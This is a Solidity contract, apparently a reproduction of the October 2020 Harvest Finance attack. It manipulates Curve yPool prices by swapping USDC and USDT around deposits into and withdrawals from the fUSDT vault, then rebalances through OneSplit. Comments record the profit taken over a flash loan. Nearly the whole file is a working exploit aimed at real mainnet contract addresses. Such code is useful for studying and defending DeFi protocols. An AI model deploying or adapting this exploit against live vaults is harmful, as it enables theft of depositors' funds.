// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interface.sol";           
         
// Block 11129500
// Block index 0
// Timestamp Mon, 26 Oct 2020 02:59:55 +0000
// Gas price 950 gwei
// Gas limit 10649595    


contract Harvest_USDC_attack {
    address EOA;
    address private constant WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UniswapETHUSDTAddress = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
    address private constant UniswapETHUSDCAddress = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address private constant UniswapV2Router02Address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address private constant USDCAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDTAddress = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    address private constant yUSDTAddress = 0x83f798e925BcD4017Eb265844FDDAbb448f1707D;
    address private constant CurveFiAddress = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address private constant USDT_VaultProxyAddress = 0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C;

    address private constant StrategyAddress = 0x1C47343eA7135c2bA3B2d24202AD960aDaFAa81c;

    IUSDT USDT = IUSDT(USDTAddress);
    IUSDC USDC = IUSDC(USDCAddress);
    yUSDT _yUSDT = yUSDT(yUSDTAddress);
    yERC20 CURVE_yPool = yERC20(CurveFiAddress);

    IfUSDT fUSDT = IfUSDT(USDT_VaultProxyAddress);
    IStrategy Strategy = IStrategy(StrategyAddress);

    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";

    string str80 = "";
    string str81 = "";
    string str82 = "";

    constructor() payable {
        StandardToken(USDTAddress).approve(CurveFiAddress, 2**256 - 1);
        StandardToken(USDCAddress).approve(CurveFiAddress, 2**256 - 1);
        StandardToken(USDTAddress).approve(USDT_VaultProxyAddress, 2**256 - 1);
        EOA = msg.sender;
    }

    receive() external payable {}
    
                    
    // loan amount = 20000000 USDC and 5000 0000 USDT
    function attack0( uint aa, uint bb, uint cc, uint dd ) public {
        // step 1: get 20000000 USDC and 5000 0000 USDT for attack
        
      // Action: Curve_USDC2USDT
      CURVE_yPool.exchange_underlying(1, 2, aa * 10 ** 6, 0); 
      // Action: fUSDT_deposit
      fUSDT.deposit(bb * 10 ** 6); 
      // Action: Curve_USDT2USDC
      CURVE_yPool.exchange_underlying(2, 1, cc * 10 ** 6, 0);  
      // Action: fUSDT_withdraw
      fUSDT.withdraw(dd * 10 ** 6); 


      // ==================== Swap ========================================
      IOneSplitAudit OneSplitAudit = IOneSplitAudit(0xC586BeF4a0992C495Cf22e1aeEE4E446CECDee0E);

      if(USDC.balanceOf(address(this)) > 20000000e6){
        uint USDCdiff = USDC.balanceOf(address(this)) - 20000000e6;
        (, uint256[] memory distribution) = OneSplitAudit.getExpectedReturn(address(USDC), address(USDT), USDCdiff, 10, 0);
        USDC.approve(address(OneSplitAudit), 0);
        USDC.approve(address(OneSplitAudit), 2**256 - 1);
        OneSplitAudit.swap(address(USDC), address(USDT), USDCdiff, 0, distribution, 0);      
      } 
      else if(USDT.balanceOf(address(this)) > 50000000e6){
        uint USDTdiff = USDT.balanceOf(address(this)) - 50000000e6;
        (, uint256[] memory distribution) = OneSplitAudit.getExpectedReturn(address(USDT), address(USDC), USDTdiff, 10, 0);
        USDT.approve(address(OneSplitAudit), 0);
        USDT.approve(address(OneSplitAudit), USDTdiff);
        OneSplitAudit.swap(address(USDT), address(USDC), USDTdiff, 0, distribution, 0); 
      }
        // USDT balance: 50319523841845 || USDC balance: 20019021562311
        // current balance      : 50319524.097758 USDT and 20019021.563454 USDC
        // compared to flashloan: 50000000        USDT and 20000000        USDC
        // Profit                   319524        USDT and    19021 USDC
    }
    
    function CurveSummary() internal returns (string memory _uintAsString){
        uint balance1 = CURVE_yPool.balances(1) / 10**6;
        uint balance2 = CURVE_yPool.balances(2) / 10**6;
        return appendWithSpace( uint2str(balance1), uint2str(balance2) );
    }
                
    function fUSDTSummary_invested_underlying() internal returns (string memory _uintAsString){
        uint invested = Strategy.investedUnderlyingBalance() / 10 ** 6;
        str81 = append("invested underlying balance: ", uint2str(invested));
        return str81;
    }
                
    function fUSDTSummary() internal returns (string memory _uintAsString){
        uint underlyingBalance =  fUSDT.underlyingBalanceInVault() / 10 ** 6;
        uint invested = Strategy.investedUnderlyingBalance() / 10 ** 6;
        uint totalSupply = fUSDT.totalSupply() / 10 ** 6;
        str80 = append("underlyingBalance: ", uint2str(underlyingBalance));
        str81 = append("invested underlying balance: ", uint2str(invested));
        str82 = append("fUSDT total supply: ", uint2str(totalSupply));
        return appendWithSpace(str80, appendWithSpace(str81, str82));
    }
                
    function ProfitSummary() internal returns (string memory _uintAsString){
        uint balance1 = USDT.balanceOf(address(this)) / 10 ** 6;
        uint balance2 = USDC.balanceOf(address(this)) / 10 ** 6;
        str80 = append("USDT balance: ", uint2str(balance1));
        str81 = append(" || USDC balance: ", uint2str(balance2));
        return append(str80, str81);
    }
                
    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }
                
                
    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }
                
    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }
                
                
                
}
                